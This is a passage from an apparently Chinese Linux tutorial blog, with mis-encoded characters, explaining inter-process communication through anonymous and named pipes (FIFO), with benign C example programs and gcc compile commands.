å…±äº«å†…å­˜(Shared Memory): å¯ä»¥è¯´è¿™æ˜¯æœ€æœ‰æ•ˆçš„è¿›ç¨‹é—´é€šä¿¡æ–¹å¼ã€‚å®ƒä½¿å¾—å¤šä¸ªè¿›ç¨‹å¯ä»¥è®¿é—®åŒä¸€å—å†…å­˜ç©ºé—´ï¼Œä¸åŒè¿›ç¨‹å¯ä»¥åŠæ—¶çœ‹åˆ°å¯¹æ–¹è¿›ç¨‹ä¸­å¯¹å…±äº«å†…å­˜ä¸­æ•°æ®çš„æ›´æ–°ã€‚è¿™ç§é€šä¿¡æ–¹å¼éœ€è¦ä¾é æŸç§åŒæ­¥æœºåˆ¶ï¼Œå¦‚äº’æ–¥é”å’Œä¿¡å·é‡ç­‰ã€‚ æ¶ˆæ¯é˜Ÿåˆ—(Messge Queue): æ¶ˆæ¯é˜Ÿåˆ—æ˜¯æ¶ˆæ¯çš„é“¾è¡¨ï¼ŒåŒ…æ‹¬ Posix æ¶ˆæ¯é˜Ÿåˆ— å’Œ System V æ¶ˆæ¯é˜Ÿåˆ—ã€‚å®ƒå…‹æœäº†å‰ä¸¤ç§é€šä¿¡æ–¹å¼ä¸­ä¿¡æ¯é‡æœ‰é™çš„ç¼ºç‚¹ï¼Œå…·æœ‰å†™æƒé™çš„è¿›ç¨‹å¯ä»¥æŒ‰ç…§ä¸€å®šçš„è§„åˆ™å‘æ¶ˆæ¯é˜Ÿåˆ—ä¸­æ·»åŠ æ¶ˆæ¯;å¯¹æ¶ˆæ¯é˜Ÿåˆ—å…·æœ‰è¯»æƒé™çš„è¿›ç¨‹åˆ™å¯ä»¥ä»æ¶ˆæ¯é˜Ÿåˆ—ä¸­è¯»å–æ¶ˆæ¯ã€‚ å¥—æ¥å­—(Socket): è¿™ä¸ªç»å¯¹æ˜¯ä¸€ç§æ›´ä¸ºä¸€èˆ¬çš„è¿›ç¨‹é—´é€šä¿¡æœºåˆ¶ï¼Œå®ƒå¯ç”¨äºç½‘ç»œä¸­ä¸åŒæœºå™¨ä¹‹é—´çš„è¿›ç¨‹é—´é€šä¿¡ï¼Œç›®å‰ç»å¸¸é‡åˆ°çš„ç½‘ç»œç¼–ç¨‹å°±ä¼šç”¨åˆ°å¥—æ¥å­—é€šä¿¡ã€‚ 0x08 ç®¡é“ ç®¡é“æ˜¯ Linux ä¸­è¿›ç¨‹é—´é€šä¿¡çš„ä¸€ç§æ–¹å¼ï¼Œå®ƒæŠŠä¸€ä¸ªç¨‹åºçš„è¾“å‡ºç›´æ¥è¿æ¥åˆ°å¦ä¸€ä¸ªç¨‹åºçš„è¾“å…¥(å…¶å®æˆ‘æ›´æ„¿æ„å°†ç®¡é“æ¯”å–»ä¸ºå†œæ‘æµ‡åœ°çš„ç®¡å­)ã€‚Linux çš„ç®¡é“ä¸»è¦åŒ…æ‹¬ä¸¤ç§ï¼šæ— åç®¡é“å’Œæœ‰åç®¡é“ã€‚è¿™ä¸€èŠ‚ä¸»è¦è®²æ— åç®¡é“ï¼Œé¦–å…ˆä»‹ç»ä»¥ä¸‹è¿™ä¸¤ç§ç®¡é“ã€‚ æ— åç®¡é“ æ— åç®¡é“æ˜¯ Linux ä¸­ç®¡é“é€šä¿¡çš„ä¸€ç§åŸå§‹æ–¹æ³•ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œå®ƒå…·æœ‰ä»¥ä¸‹ç‰¹ç‚¹ï¼š å®ƒåªèƒ½ç”¨äºå…·æœ‰äº²ç¼˜å…³ç³»çš„è¿›ç¨‹ä¹‹é—´çš„é€šä¿¡ï¼ˆä¹Ÿå°±æ˜¯çˆ¶å­è¿›ç¨‹æˆ–è€…å…„å¼Ÿè¿›ç¨‹ä¹‹é—´ï¼‰ï¼› å®ƒæ˜¯ä¸€ä¸ªåŠåŒå·¥çš„é€šä¿¡æ¨¡å¼ï¼Œå…·æœ‰å›ºå®šçš„è¯»ç«¯å’Œå†™ç«¯ï¼› ç®¡é“ä¹Ÿå¯ä»¥çœ‹æˆæ˜¯ä¸€ç§ç‰¹æ®Šçš„æ–‡ä»¶ï¼Œå¯¹äºå®ƒçš„è¯»å†™ä¹Ÿå¯ä»¥ä½¿ç”¨æ™®é€šçš„ read()ã€write() ç­‰å‡½æ•°ã€‚ä½†å®ƒä¸æ˜¯æ™®é€šçš„æ–‡ä»¶ï¼Œå¹¶ä¸å±äºå…¶ä»–ä»»ä½•æ–‡ä»¶ç³»ç»Ÿå¹¶ä¸”åªå­˜åœ¨äºå†…å­˜ä¸­ã€‚ æœ‰åç®¡é“(FIFO) æœ‰åç®¡é“æ˜¯å¯¹æ— åç®¡é“çš„ä¸€ç§æ”¹è¿›ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œå®ƒå…·æœ‰ä»¥ä¸‹ç‰¹ç‚¹ï¼š å®ƒå¯ä»¥ä½¿äº’ä¸ç›¸å…³çš„ä¸¤ä¸ªè¿›ç¨‹é—´å®ç°å½¼æ­¤é€šä¿¡ï¼› è¯¥ç®¡é“å¯ä»¥é€šè¿‡è·¯å¾„åæ¥æŒ‡å‡ºï¼Œå¹¶ä¸”åœ¨æ–‡ä»¶ç³»ç»Ÿä¸­æ˜¯å¯è§çš„ã€‚åœ¨å»ºç«‹äº†ç®¡é“ä¹‹åï¼Œä¸¤ä¸ªè¿›ç¨‹å°±å¯ä»¥æŠŠå®ƒå½“åšæ™®é€šæ–‡ä»¶ä¸€æ ·è¿›è¡Œè¯»å†™æ“ä½œï¼Œä½¿ç”¨éå¸¸æ–¹ä¾¿ï¼› FIFO ä¸¥æ ¼åœ°éµå¾ªå…ˆè¿›å…ˆå‡ºè§„åˆ™ï¼Œå¯¹ç®¡é“åŠ FIFO çš„è¯»æ€»æ˜¯ä»å¼€å§‹å¤„è¿”å›æ•°æ®ï¼Œå¯¹å®ƒä»¬çš„å†™åˆ™æ˜¯æŠŠæ•°æ®æ·»åŠ åˆ°æœ«å°¾ï¼Œå®ƒä»¬ä¸æ”¯æŒå¦‚ lseek() ç­‰æ–‡ä»¶å®šä½æ“ä½œã€‚ æ— åç®¡é“åŠç³»ç»Ÿè°ƒç”¨ ç®¡é“åˆ›å»ºä¸ç®¡é“è¯´æ˜ ç®¡é“æ˜¯åŸºäºæ–‡ä»¶æè¿°ç¬¦çš„é€šä¿¡æ–¹å¼ï¼Œå½“ä¸€ä¸ªç®¡é“å»ºç«‹æ—¶ï¼Œå®ƒä¼šåˆ›å»ºä¸¤ä¸ªæ–‡ä»¶æè¿°ç¬¦ fd[0] å’Œ fd[1]ï¼Œå…¶ä¸­ fd[0] å›ºå®šç”¨äºè¯»ç®¡é“ï¼Œè€Œ fd[1] å›ºå®šç”¨äºå†™ç®¡é“ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œè¿™æ ·å°±æ„æˆäº†ä¸€ä¸ªåŠåŒå·¥çš„é€šé“ã€‚ ç®¡é“å…³é—­æ—¶åªéœ€è¦å°†è¿™ä¸¤ä¸ªæ–‡ä»¶æè¿°ç¬¦å…³é—­å³å¯ï¼Œå¯ä½¿ç”¨æ™®é€šçš„ close() å‡½æ•°é€ä¸ªå…³é—­å„ä¸ªæ–‡ä»¶æè¿°ç¬¦ã€‚ ç®¡é“åˆ›å»ºå‡½æ•° åˆ›å»ºç®¡é“å¯ä»¥ç”¨ pipe() å‡½æ•°å®ç°ï¼Œå…·ä½“å¦‚ä¸‹ï¼š 1234567#include &lt;unistd.h&gt; //æ‰€éœ€å¤´æ–‡ä»¶int pipe(int fd[2]) //å‡½æ•°åŸå‹/*å‡½æ•°å‚æ•°ï¼šfd[2] ç®¡é“çš„ä¸¤ä¸ªæ–‡ä»¶æè¿°ç¬¦ï¼Œå‡½æ•°è°ƒç”¨ä¹‹åå¯ä»¥ç›´æ¥æ“ä½œè¿™ä¸¤ä¸ªæ–‡ä»¶æè¿°ç¬¦è¿”å›å€¼ï¼š0 - æˆåŠŸï¼Œ-1 - å‡ºé”™*/ ç®¡é“è¯»å†™è¯´æ˜ ç”¨ pipe() åˆ›å»ºçš„ç®¡é“ä¸¤ç«¯å¤„äºåŒä¸€ä¸ªè¿›ç¨‹ä¸­ï¼Œç”±äºç®¡é“ä¸»è¦æ˜¯ç”¨äºåœ¨ä¸åŒçš„è¿›ç¨‹é—´é€šä¿¡çš„ï¼Œå› æ­¤ï¼Œåœ¨å®é™…åº”ç”¨ä¸­æ²¡æœ‰å¤ªå¤§æ„ä¹‰ã€‚å®é™…ä¸Šï¼Œé€šå¸¸å…ˆæ˜¯åˆ›å»ºä¸€ä¸ªç®¡é“ï¼Œå†è°ƒç”¨ fork() å‡½æ•°åˆ›å»ºä¸€ä¸ªå­è¿›ç¨‹ï¼Œè¯¥å­è¿›ç¨‹ä¼šç»§æ‰¿çˆ¶è¿›ç¨‹æ‰€åˆ›å»ºçš„ç®¡é“ï¼Œè¿™æ—¶ï¼Œçˆ¶å­è¿›ç¨‹ç®¡é“çš„æ–‡ä»¶æè¿°ç¬¦å¯¹åº”å…³ç³»å¦‚ä¸‹å›¾: æ­¤æ—¶çš„å…³ç³»çœ‹ä¼¼éå¸¸å¤æ‚ï¼Œå®é™…ä¸Šå´å·²ç»ç»™ä¸åŒè¿›ç¨‹ä¹‹é—´çš„è¯»å†™åˆ›é€ äº†å¾ˆå¥½çš„æ¡ä»¶ã€‚çˆ¶å­è¿›ç¨‹åˆ†åˆ«æ‹¥æœ‰è‡ªå·±çš„è¯»å†™é€šé“ï¼Œä¸ºäº†å®ç°çˆ¶å­è¿›ç¨‹ä¹‹é—´çš„è¯»å†™ï¼Œåªéœ€æŠŠæ— å…³çš„è¯»ç«¯æˆ–å†™ç«¯çš„æ–‡ä»¶æè¿°ç¬¦å…³é—­å³å¯ã€‚å°†çˆ¶è¿›ç¨‹çš„å†™ç«¯ fd[1] å’Œå­è¿›ç¨‹çš„è¯»ç«¯ fd[0] å…³é—­ï¼Œåˆ™çˆ¶å­è¿›ç¨‹ä¹‹é—´å°±å»ºç«‹èµ·ä¸€æ¡â€œå­è¿›ç¨‹å†™å…¥çˆ¶è¿›ç¨‹è¯»å–â€çš„é€šé“ã€‚ åŒæ ·ï¼Œä¹Ÿå¯ä»¥å°†çˆ¶è¿›ç¨‹çš„è¯»ç«¯ fd[0] å’Œå­è¿›ç¨‹çš„å†™ç«¯ fd[1] å…³é—­ï¼Œåˆ™çˆ¶å­è¿›ç¨‹ä¹‹é—´å°±å»ºç«‹èµ·ä¸€æ¡â€œçˆ¶è¿›ç¨‹å†™å…¥å­è¿›ç¨‹è¯»å–â€çš„é€šé“ã€‚ å¦å¤–ï¼Œçˆ¶è¿›ç¨‹è¿˜å¯ä»¥åˆ›å»ºå¤šä¸ªå­è¿›ç¨‹ï¼Œå„ä¸ªå­è¿›ç¨‹éƒ½ç»§æ‰¿äº†ç›¸åº”çš„ fd[0] å’Œ fd[1] ï¼Œæ­¤æ—¶ï¼Œåªéœ€è¦å…³é—­ç›¸åº”çš„ç«¯å£å°±å¯ä»¥å»ºç«‹å„å­è¿›ç¨‹ä¹‹é—´çš„çš„é€šé“ã€‚ ç®¡é“è¯»å†™æ³¨æ„ç‚¹ åªæœ‰åœ¨ç®¡é“çš„è¯»ç«¯å­˜åœ¨æ—¶ï¼Œå‘ç®¡é“å†™å…¥æ•°æ®æ‰æœ‰æ„ä¹‰ã€‚å¦åˆ™ï¼Œå‘ç®¡é“å†™å…¥æ•°æ®çš„è¿›ç¨‹å°†æ”¶åˆ°å†…æ ¸ä¼ æ¥çš„ SIGPIPE ä¿¡å·(é€šå¸¸ä¸º Broken pipe é”™è¯¯)ã€‚ å‘ç®¡é“å†™å…¥æ•°æ®æ—¶ï¼ŒLinux å°†ä¸ä¿è¯å†™å…¥çš„åŸå­æ€§ï¼Œç®¡é“ç¼“å†²åŒºä¸€æœ‰ç©ºé—²åŒºåŸŸï¼Œå†™è¿›ç¨‹å°±ä¼šè¯•å›¾å‘ç®¡é“å†™å…¥æ•°æ®ã€‚å¦‚æœè¯»è¿›ç¨‹ä¸è¯»å–ç®¡é“ç¼“å†²åŒºä¸­çš„æ•°æ®ï¼Œé‚£ä¹ˆå†™è¿›ç¨‹å°†ä¼šä¸€ç›´é˜»å¡ã€‚ çˆ¶å­è¿›ç¨‹åœ¨è¿è¡Œæ—¶ï¼Œå®ƒä»¬çš„å…ˆåæ¬¡åºå¹¶ä¸èƒ½ä¿è¯ã€‚å› æ­¤ï¼Œä¸ºäº†ä¿è¯çˆ¶å­è¿›ç¨‹å·²ç»å…³é—­äº†ç›¸åº”çš„æ–‡ä»¶æè¿°ç¬¦ï¼Œå¯åœ¨ä¸¤ä¸ªè¿›ç¨‹ä¸­è°ƒç”¨ sleep()å‡½æ•°ã€‚å½“ç„¶ï¼Œæœ€å¥½è¿˜æ˜¯é‡‡ç”¨è¿›ç¨‹ä¹‹é—´çš„åŒæ­¥ä¸äº’æ–¥æœºåˆ¶ã€‚ ç®¡é“é€šä¿¡å®éªŒ ä¸‹é¢ï¼Œæˆ‘ä»¬é€šè¿‡ä¸€ä¸ªå°çš„å®ä¾‹ä»£ç æ¥å­¦ä¹ è¿›ç¨‹å¦‚ä½•é€šè¿‡ç®¡é“æ¥é€šä¿¡çš„ã€‚åœ¨ VS code çª—å£ä¸­åˆ›å»ºæ–°çš„æ–‡ä»¶ pipe.c ï¼Œç„¶åæ·»åŠ å¦‚ä¸‹ä»£ç å†…å®¹ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960#include &lt;unistd.h&gt;#include &lt;sys/types.h&gt;#include &lt;errno.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;sys/wait.h&gt;#define MAX_DATA_LEN 128#define DELAY_TIME 3int main()&#123; pid_t pid; int pipe_fd[2]; char buf[MAX_DATA_LEN]; const char data[] = &quot;Pipe Demo Program&quot;; int real_read; int real_write; memset((void *)buf, 0, sizeof(buf)); if(pipe(pipe_fd) &lt; 0) &#123; printf(&quot;pepe create error\\n&quot;); exit(1); &#125; pid = fork(); if(pid == 0) &#123; //å­è¿›ç¨‹ï¼Œå…³é—­å†™æè¿°ç¬¦ï¼Œé€šè¿‡sleep(3)ç­‰å¾…çˆ¶è¿›ç¨‹å…³é—­ç›¸åº”çš„è¯»æè¿°ç¬¦ close(pipe_fd[1]); sleep(DELAY_TIME); //å­è¿›ç¨‹è¯»å–ç®¡é“å†…å®¹ real_read = read(pipe_fd[0], buf, MAX_DATA_LEN); if(real_read &gt; 0) &#123; printf(&quot;Child progress : read %d bytes from the pipe : &#x27;%s&#x27; \\n&quot;, real_read, buf); &#125; close(pipe_fd[0]); exit(0); &#125; else if(pid &gt; 0) &#123; //çˆ¶è¿›ç¨‹ï¼Œå…³é—­è¯»æè¿°ç¬¦ï¼Œå¹¶é€šè¿‡ç¡çœ 3ç§’ç­‰å¾…å­è¿›ç¨‹å…³é—­å¯¹åº”çš„å†™æè¿°ç¬¦ close(pipe_fd[0]); sleep(DELAY_TIME); //å†™ç®¡é“å†…å®¹ real_write = write(pipe_fd[1], data, strlen(data)); if(real_write != -1) &#123; printf(&quot;Parent progress : write %d bytes to the pipe : &#x27;%s&#x27; \\n&quot;, real_write, data); &#125; close(pipe_fd[1]); waitpid(pid, NULL, 0); //ç­‰å¾…å­è¿›ç¨‹ç»“æŸ &#125; return 0;&#125; æ·»åŠ å®Œæˆåï¼Œå¦‚ä¸‹å›¾ï¼š åœ¨ VS Code å¹³å°ä¸‹çš„ç»ˆç«¯çª—å£ä¸­è¾“å…¥ä»¥ä¸‹å‘½ä»¤è¿›è¡Œç¼–è¯‘å’Œè¿è¡Œï¼Œè§‚å¯Ÿç¨‹åºæœ€ç»ˆç»“æœï¼š 12gcc pipe.c -o pipe./pipe æœ‰åç®¡é“åŠå…¶ç³»ç»Ÿè°ƒç”¨ æœ‰åç®¡é“æ˜¯å¯¹æ— åç®¡é“çš„ä¸€ç§æ”¹è¿›ï¼Œå®ƒå…·æœ‰ä»¥ä¸‹ç‰¹ç‚¹ï¼š å®ƒå¯ä»¥ä½¿äº’ä¸ç›¸å…³çš„ä¸¤ä¸ªè¿›ç¨‹é—´å®ç°å½¼æ­¤é€šä¿¡ï¼› è¯¥ç®¡é“å¯ä»¥é€šè¿‡è·¯å¾„åæ¥æŒ‡å‡ºï¼Œå¹¶ä¸”åœ¨æ–‡ä»¶ç³»ç»Ÿä¸­æ˜¯å¯è§çš„ã€‚åœ¨å»ºç«‹äº†ç®¡é“ä¹‹åï¼Œä¸¤ä¸ªè¿›ç¨‹å°±å¯ä»¥æŠŠå®ƒå½“åšæ™®é€šæ–‡ä»¶ä¸€æ ·è¿›è¡Œè¯»å†™æ“ä½œï¼Œä½¿ç”¨éå¸¸æ–¹ä¾¿ï¼› FIFO ä¸¥æ ¼åœ°éµå¾ªå…ˆè¿›å…ˆå‡ºè§„åˆ™ï¼Œå¯¹ç®¡é“åŠ FIFO çš„è¯»æ€»æ˜¯ä»å¼€å§‹å¤„è¿”å›æ•°æ®ï¼Œå¯¹å®ƒä»¬çš„å†™åˆ™æ˜¯æŠŠæ•°æ®æ·»åŠ åˆ°æœ«å°¾ï¼Œå®ƒä»¬ä¸æ”¯æŒå¦‚ lseek() ç­‰æ–‡ä»¶å®šä½æ“ä½œã€‚ æœ‰åç®¡é“çš„åˆ›å»ºå¯ä»¥ä½¿ç”¨å‡½æ•° mkfifo()ï¼Œè¯¥å‡½æ•°ç±»ä¼¼ä¸æ–‡ä»¶ä¸­çš„ open() æ“ä½œï¼Œå¯ä»¥æŒ‡å®šç®¡é“çš„è·¯å¾„å’Œæ‰“å¼€çš„æ¨¡å¼ã€‚åŒæ—¶è¿˜å¯ä»¥åœ¨ç»ˆç«¯çª—å£ä½¿ç”¨å‘½ä»¤æ¥åˆ›å»ºæœ‰åç®¡é“ã€‚ 1mknod [ç®¡é“å] p åœ¨ç®¡é“åˆ›å»ºæˆåŠŸåï¼Œå°±å¯ä»¥ä½¿ç”¨ open()ã€write() å’Œ read() è¿™äº›å‡½æ•°äº†ã€‚ä¸æ™®é€šæ–‡ä»¶çš„å¼€å‘è®¾ç½®ä¸€æ ·ï¼Œå¯¹äºä¸ºè¯»è€Œæ‰“å¼€çš„ç®¡é“å¯åœ¨ open() ä¸­è®¾ç½® O_RDONLYï¼Œå¯¹äºä¸ºå†™è€Œæ‰“å¼€çš„ç®¡é“å¯åœ¨ open() ä¸­è®¾ç½® O_WRONLYï¼Œåœ¨è¿™é‡Œä¸æ™®é€šæ–‡ä»¶ä¸åŒçš„æ˜¯é˜»å¡é—®é¢˜ã€‚ç”±äºæ™®é€šæ–‡ä»¶åœ¨è¯»å†™æ—¶ä¸ä¼šå‡ºç°é˜»å¡é—®é¢˜ï¼Œè€Œåœ¨ç®¡é“çš„è¯»å†™ä¸­å´æœ‰é˜»å¡çš„å¯èƒ½ï¼Œè¿™é‡Œçš„éé˜»å¡æ ‡å¿—å¯ä»¥åœ¨ open() å‡½æ•°ä¸­è®¾å®šä¸º O_NONBLOCKã€‚ ä¸‹é¢åˆ†åˆ«å¯¹é˜»å¡æ‰“å¼€å’Œéé˜»å¡æ‰“å¼€çš„è¯»å†™è¿›è¡Œè¯´æ˜ï¼š å¯¹äºè¯»è¿›ç¨‹ï¼š è‹¥è¯¥ç®¡é“æ˜¯é˜»å¡æ‰“å¼€ï¼Œä¸”å½“å‰ FIFO å†…æ²¡æœ‰æ•°æ®ï¼Œåˆ™å¯¹è¯»è¿›ç¨‹è€Œè¨€å°†ä¸€ç›´é˜»å¡åˆ°æœ‰æ•°æ®å†™å…¥ã€‚ è‹¥è¯¥ç®¡é“æ˜¯éé˜»å¡æ‰“å¼€ï¼Œåˆ™ä¸è®º FIFO å†…æ˜¯å¦æœ‰æ•°æ®ï¼Œè¯»è¿›ç¨‹éƒ½ä¼šç«‹å³æ‰§è¡Œè¯»æ“ä½œã€‚å³å¦‚æœ FIFO å†…æ²¡æœ‰æ•°æ®ï¼Œåˆ™è¯»å‡½æ•°å°†ç«‹åˆ»è¿”å› 0ã€‚ å¯¹äºå†™è¿›ç¨‹ è‹¥è¯¥ç®¡é“æ˜¯é˜»å¡æ‰“å¼€ï¼Œåˆ™å†™æ“ä½œå°†ä¸€ç›´é˜»å¡åˆ°æ•°æ®å¯ä»¥è¢«å†™å…¥ã€‚ è‹¥è¯¥ç®¡é“æ˜¯éé˜»å¡æ‰“å¼€è€Œä¸èƒ½å†™å…¥å…¨éƒ¨æ•°æ®ï¼Œåˆ™è¯»æ“ä½œè¿›è¡Œéƒ¨åˆ†å†™å…¥æˆ–è€…è°ƒç”¨å¤±è´¥ã€‚ å¯¹äº mkfifo() å‡½æ•°ä»‹ç»å¦‚ä¸‹ï¼š 1234567891011121314151617#include &lt;sys/types.h&gt;#include &lt;sys/state.h&gt;//å‡½æ•°åŸå‹int mkfifo(const char *filename, mode_t mode)/*å‚æ•°ï¼š- filename: è¦åˆ›å»ºçš„ç®¡é“ï¼ŒåŒ…å«è·¯å¾„- mode: O_RDONLY:è¯»ç®¡é“ O_WRONLY:å†™ç®¡é“ O_RDWR:è¯»å†™ç®¡é“ O_NONBLOCK:éé˜»å¡ O_CREAT:å¦‚æœè¯¥æ–‡ä»¶ä¸å­˜åœ¨ï¼Œé‚£ä¹ˆå°±åˆ›å»ºä¸€ä¸ªæ–°çš„æ–‡ä»¶ï¼Œå¹¶ç”¨ç¬¬ä¸‰ä¸ªå‚æ•°ä¸ºå…¶è®¾ç½®æƒé™ O_EXECLï¼šå¦‚æœä½¿ç”¨O_CREATæ—¶æ–‡ä»¶å­˜åœ¨ï¼Œé‚£ä¹ˆå¯è¿”å›é”™è¯¯æ¶ˆæ¯ã€‚è¿™ä¸ªå‚æ•°å¯æµ‹è¯•æ–‡ä»¶æ˜¯å¦å­˜åœ¨è¿”å›å€¼ï¼šæˆåŠŸè¿”å› 0 ï¼Œå¤±è´¥è¿”å› -1*/ æœ‰åç®¡é“å®éªŒ å¯¹äºæœ‰åç®¡é“çš„ä½¿ç”¨å°±ä¸éœ€è¦åƒæ— åç®¡é“é‚£æ ·ä½¿ç”¨ fork() åˆ›å»ºå­è¿›ç¨‹æ¥è¿›è¡Œé€šä¿¡ï¼Œæœ‰åç®¡é“æ˜¯å¯ä»¥åœ¨æ²¡æœ‰äº²å±å…³ç³»çš„è¿›ç¨‹ä¹‹é—´è¿›è¡Œé€šä¿¡çš„ã€‚æ‰€ä»¥åœ¨è¿™ä¸ªå®éªŒä¸­ï¼Œæˆ‘ä»¬å°†è¦ç¼–å†™ä¸¤ä¸ªç¨‹åºï¼Œé€šè¿‡æ‰§è¡Œè¿™ä¸¤ä¸ªè¿›ç¨‹åœ¨å·¥ä½œè¿‡ç¨‹ä¸­ä½¿ç”¨ fifo é€šä¿¡æ¥è¿›è¡Œå®éªŒã€‚è¿™ä¸¤ä¸ªç¨‹åºä¸€ä¸ªè´Ÿè´£å‘ç®¡é“ç§å†™æ•°æ®ï¼Œä¸€ä¸ªè´Ÿè´£è¯»æ•°æ®ã€‚å†™æ•°æ®çš„ç¨‹åºä¸º fifo_write.c ï¼Œè¯»æ•°æ®çš„ä»£ç æ–‡ä»¶ä¸º fifo_read.cï¼Œå…·ä½“å¦‚ä¸‹ï¼š åœ¨ VS Code å¹³å°ä¸‹åˆ›å»º fifo_write.c æ–‡ä»¶ï¼Œå¦‚ä¸‹å›¾ï¼š æ·»åŠ ä»¥ä¸‹å†…å®¹å¦‚ä¸‹ï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253#include &lt;sys/types.h&gt;#include &lt;sys/stat.h&gt;#include &lt;errno.h&gt;#include &lt;fcntl.h&gt;#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;#include &lt;limits.h&gt;#include &lt;string.h&gt;#include &lt;unistd.h&gt;#define FIFO_NAME &quot;/tmp/demo_fifo&quot; /* æœ‰åç®¡é“åç§° */#define MAX_BUFFER_SIZE PIPE_BUF /* å®šä¹‰æ•°æ®é•¿åº¦ï¼Œä½¿ç”¨ limits.h ä¸­çš„ PIPE_BUF é•¿åº¦ */int main(int argc, char *argv[])&#123; int fd; char buff[MAX_BUFFER_SIZE]; int nwrite; fd = open(FIFO_NAME, O_WRONLY); if(fd == -1) &#123; printf(&quot;Open fifo file error\\n&quot;); exit(1); &#125; while(1) &#123; //ä»é”®ç›˜è·å–è¾“å…¥çš„å­—ç¬¦ï¼Œå°†æ•°æ®å­˜å…¥ buff memset(buff, 0, MAX_BUFFER_SIZE); printf(&quot;è¯·è¾“å…¥éœ€è¦å‘ FIFO ä¸­å‘é€çš„æ•°æ®ï¼š(q/Q é€€å‡º)\\n&quot;); scanf(&quot;%s&quot;, buff); /* åˆ¤æ–­é€€å‡ºæ¡ä»¶ */ if(!strcmp(buff, &quot;q&quot;) || !strcmp(buff, &quot;Q&quot;)) &#123; printf(&quot;[%d] write fifo ç¨‹åºé€€å‡º....&quot;, getpid()); break; &#125; nwrite = write(fd, buff, strlen(buff)+1); if(nwrite &gt; 0) &#123; printf(&quot;Write &#x27;%s&#x27; to FIFO\\n&quot;, buff); &#125; else&#123; printf(&quot;Write FIFO error...\\n&quot;); break; &#125; &#125; close(fd); return 0;&#125; åœ¨ VS Code å¹³å°ä¸‹åˆ›å»º fifo_read.c æ–‡ä»¶ï¼Œå¦‚å›¾ï¼š æ·»åŠ å†…å®¹å¦‚ä¸‹ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960#include &lt;sys/types.h&gt;#include &lt;sys/stat.h&gt;#include &lt;errno.h&gt;#include &lt;fcntl.h&gt;#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;#include &lt;limits.h&gt;#include &lt;string.h&gt;#include &lt;unistd.h&gt;#define FIFO_NAME &quot;/tmp/demo_fifo&quot; /* æœ‰åç®¡é“åç§° */#define MAX_BUFFER_SIZE PIPE_BUF /* å®šä¹‰æ•°æ®é•¿åº¦ï¼Œä½¿ç”¨ limits.h ä¸­çš„ PIPE_BUF é•¿åº¦ */int main(int argc, char *argv[])&#123; int fd; char buff[MAX_BUFFER_SIZE]; int nread; /* åˆ¤æ–­ FIFO æ–‡ä»¶æ˜¯å¦å­˜åœ¨ï¼Œå¦‚æœä¸å­˜åœ¨åˆ™åˆ›å»º */ if(access(FIFO_NAME, F_OK) == -1) &#123; if((mkfifo(FIFO_NAME, 0666) &lt; 0) &amp;&amp; (errno != EEXIST)) &#123; printf(&quot;Cannot create fifo file\\n&quot;); exit(1); &#125; &#125; fd = open(FIFO_NAME, O_RDONLY); if(fd == -1) &#123; printf(&quot;Open fifo file error\\n&quot;); exit(1); &#125; while(1) &#123; //ä»é”®ç›˜è·å–è¾“å…¥çš„å­—ç¬¦ï¼Œå°†æ•°æ®å­˜å…¥ buff memset(buff, 0, MAX_BUFFER_SIZE); nread = read(fd, buff, MAX_BUFFER_SIZE); if(!strcmp(buff, &quot;q&quot;) || !strcmp(buff, &quot;Q&quot;)) &#123; printf(&quot;[%d] read fifo ç¨‹åºé€€å‡º....&quot;, getpid()); break; &#125; if(nread &gt; 0) &#123; printf(&quot;Read &#x27;%s&#x27; from FIFO\\n&quot;, buff); &#125; else&#123; printf(&quot;Read FIFO error...\\n&quot;); break; &#125; &#125; close(fd); return 0;&#125; ç¼–å†™å®Œä»£ç åï¼Œåœ¨ç»ˆç«¯é€šè¿‡ gcc è¿›è¡Œç¼–è¯‘ï¼Œåœ¨æ‰§è¡Œçš„æ—¶å€™åˆ†ä¸ºä¸¤ä¸ªç»ˆç«¯çª—å£æ¥æ‰§è¡Œï¼Œé¦–å…ˆæ‰§è¡Œç®¡é“è¯»ç¨‹åº fifo_readï¼Œç„¶ååœ¨å¦ä¸€ä¸ªçª—å£ä¸­å¯åŠ¨ç®¡é“å†™è¿›ç¨‹ fifo_writeï¼Œå…·ä½“ç»“æœå¦‚ä¸‹ï¼š 12gcc fifo_read.c -o fifo_readgcc fifo_write.c -o fifo_write","tags":[{"name":"Linux","slug":"Linux","permalink":"https://hodlyounger.github.io/tags/Linux/"},{"name":"å†…æ ¸","slug":"å†…æ ¸","permalink":"https://hodlyounger.github.io/tags/%E5%86%85%E6%A0%B8/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"https://hodlyounger.github.io/categories/A-OS/"},{"name":"Linux","slug":"A-OS/Linux","permalink":"https://hodlyounger.github.io/categories/A-OS/Linux/"},{"name":"Linuxæ“ä½œç³»ç»ŸåŸç†å‰–æ","slug":"A-OS/Linux/Linuxæ“ä½œç³»ç»ŸåŸç†å‰–æ","permalink":"https://hodlyounger.github.io/categories/A-OS/Linux/Linux%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%8E%9F%E7%90%86%E5%89%96%E6%9E%90/"}]},{"title":"ã€åŸç†å‰–æã€‘6-è¿›ç¨‹é—´é€šä¿¡æ–¹å¼ä¹‹ä¿¡å·é‡é€šä¿¡","date":"2023-12-25T16:00:00.000Z","path":"A_OS/Linux/Linuxæ“ä½œç³»ç»ŸåŸç†å‰–æ/ã€åŸç†å‰–æã€‘6-è¿›ç¨‹é—´é€šä¿¡æ–¹å¼ä¹‹ä¿¡å·é‡é€šä¿¡/","text":"çŸ¥è¯†ç‚¹ï¼š Linux ä¿¡å·é‡é€šä¿¡åŸç†ä»‹ç» Linux ä¿¡å·é‡é€šä¿¡ç›¸å…³ API ä»‹ç» 0x01 Linux ä¿¡å·é‡æ¦‚è¿° åœ¨ Linux 